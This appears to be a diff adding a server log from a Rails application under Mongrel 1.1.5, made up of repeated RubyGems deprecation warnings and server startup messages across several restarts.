+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
